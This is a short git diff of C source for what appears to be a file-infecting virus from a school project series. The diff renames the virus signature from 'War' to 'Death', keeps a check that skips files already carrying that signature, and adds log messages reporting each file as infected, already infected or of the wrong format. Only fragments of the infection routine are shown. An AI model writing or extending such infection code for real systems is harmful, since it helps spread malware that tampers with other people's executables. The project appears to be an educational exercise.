@@ -1,4 +1,4 @@
-#include "war.h"
+#include "death.h"
 
 ssize_t get_file_size(const char *file_name)
 {
@@ -29,8 +29,9 @@ int copy_file(t_woody *woody, char *filename)
 	char *string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++)
 	{
-		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "War version 1.0 (c)oded mar-2023 by jraye-slynell", 49) != NULL)
+		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Death version 1.0 (c)oded mar-2023 by jraye-slynell", 51) != NULL)
 		{
+			log_bonus(woody->filename, " - is already infected!\n");
 			close(fd);
 			return ERROR_CODE;
 		}
@@ -57,7 +58,7 @@ void do_replace_image(char *filename, char *path)
 	while ((nread = fread(buffer, sizeof(char), sizeof(buffer), input)) != 0){
 		fwrite(buffer, sizeof(char), nread, output);
 	}
-
+	log_bonus(filename, " - infected!\n");
 	free(rpath);
 	free(new_path);
 	fclose(input);
@@ -89,6 +90,7 @@ int check_fileformat(unsigned char *c, char *filename, char *path, ssize_t files
 	}
 	else
 	{
+		log_bonus(filename, " - are not infected (wrong format file)!\n");
 		free(filename);
 		return ERROR_CODE;
 	}
